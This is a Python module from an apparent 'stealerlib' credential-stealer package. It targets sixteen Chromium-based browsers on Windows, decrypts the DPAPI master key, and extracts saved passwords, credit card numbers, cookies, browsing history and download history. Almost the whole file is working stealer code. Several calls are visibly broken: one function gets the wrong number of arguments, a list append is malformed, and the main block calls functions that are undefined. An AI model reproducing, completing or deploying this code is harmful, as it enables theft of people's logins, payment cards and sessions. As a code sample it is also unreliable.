#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/chromium.py
"""

from stealerlib.browser import *
from stealerlib.exceptions import *


class Chromium:
    """This class provides methods for extracting and decrypting passwords from Browser databases.

    Attributes:
        usernames       Saved Chrome Usernames
        passwords       Saved Chrome Passwords
        credentials     A list of tuples containing the username, password and URL -
                        for each site a password was saved on

        valid_browsers  A list of the names/keys for each browser that the user has installed
        browsers        Dictionary of browser names and their respective paths
        path            Path to the current browsers base directory (derived from self.browsers)
        key             Encryption key to be used when accessing encrypted values in the database
    """

    def __init__(self):
        self.key = b""
        self.path = ""
        self.appdata = appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'amigo': appdata + '\\Amigo\\User Data',
            'torch': appdata + '\\Torch\\User Data',
            'kometa': appdata + '\\Kometa\\User Data',
            'orbitum': appdata + '\\Orbitum\\User Data',
            'cent-browser': appdata + '\\CentBrowser\\User Data',
            '7star': appdata + '\\7Star\\7Star\\User Data',
            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': appdata + '\\Iridium\\User Data',
        }
        self.valid_browsers = self.installed_browsers()

    @catch
    def get_encryption_key(self) -> bytes:
        """Retrieves the master encryption key used to encrypt the user's Chrome data

        Parameters:
            self (object): The object passed to the method

        Returns:
            bytes: The encryption key we'll use to decrypt the user's passwords
        """

        with open(self.path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        m_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        m_key = m_key[5:]
        m_key = win32crypt.CryptUnprotectData(m_key, None, None, None, 0)[1]

        return m_key

    @catch
    def decrypt_password(self, buff: bytes) -> str:
        """Decrypts an encrypted password using the given encryption key

        Parameters:
            self (object): The object passed to the method
            buff (bytes): The encrypted password buffer to decrypt
            key (str): The master key to use for the decryption

        Returns:
            str: The decrypted password
        """

        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(self.key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    @catch
    def get_login_data(self):
        passwords = []

        login_db = f'{self.path}\\"Default"\\Login Data'
        if not os.path.exists(login_db):
            return

        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        for row in cursor.fetchall():
            password = self.decrypt_password(row[2], self.key)
            passwords.append(row[1], password, row[0])

        conn.close()
        os.remove('login_db')
        print(passwords)
        return passwords

    @catch
    def get_credit_cards(self):
        cards_db = f'{self.path}\\"Default"\\Web Data'
        if not os.path.exists(cards_db):
            return

        result = ""
        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = self.decrypt_password(row[3], self.key)
            result += f"""
            Name On Card: {row[0]}
            Card Number: {card_number}
            Expires On:  {row[1]} / {row[2]}
            Added On: {datetime.fromtimestamp(row[4])}
            
            """

        conn.close()
        os.remove('cards_db')
        return result

    @catch
    def get_cookies(self):
        cookie_db = f'{self.path}\\"Default"\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return
        result = ""
        shutil.copy(cookie_db, 'cookie_db')
        conn = sqlite3.connect('cookie_db')
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            cookie = self.decrypt_password(row[3], self.key)

            result += f"""
            Host Key : {row[0]}
            Cookie Name : {row[1]}
            Path: {row[2]}
            Cookie: {cookie}
            Expires On: {row[4]}
            
            """

        conn.close()
        os.remove('cookie_db')
        return result

    @catch
    def get_web_history(self):
        web_history_db = f'{self.path}\\"Default"\\History'
        result = ""
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            result += f"""
            URL: {row[0]}
            Title: {row[1]}
            Visited Time: {row[2]}
            
            """
        conn.close()
        os.remove('web_history_db')
        return result

    @catch
    def get_downloads(self):
        downloads_db = f'{self.path}\\"Default"\\History'
        if not os.path.exists(downloads_db):
            return
        result = ""
        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            result += f"""
            Download URL: {row[0]}
            Local Path: {row[1]}

            """

        conn.close()
        os.remove('downloads_db')

    @catch
    def installed_browsers(self):
        installed = []
        for browser, path in self.browsers.items():
            if os.path.exists(path):
                installed.append(browser)

        return installed


if __name__ == '__main__':
    available_browsers = installed_browsers()

    for browser in available_browsers:

        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        print(f"Getting Stored Details from {browser}")

        print("\t [!] Getting Saved Passwords")
        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
        print("\t------\n")

        print("\t [!] Getting Browser History")
        save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
        print("\t------\n")

        print("\t [!] Getting Download History")
        save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
        print("\t------\n")

        print("\t [!] Getting Cookies")
        save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
        print("\t------\n")

        print("\t [!] Getting Saved Credit Cards")
        save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))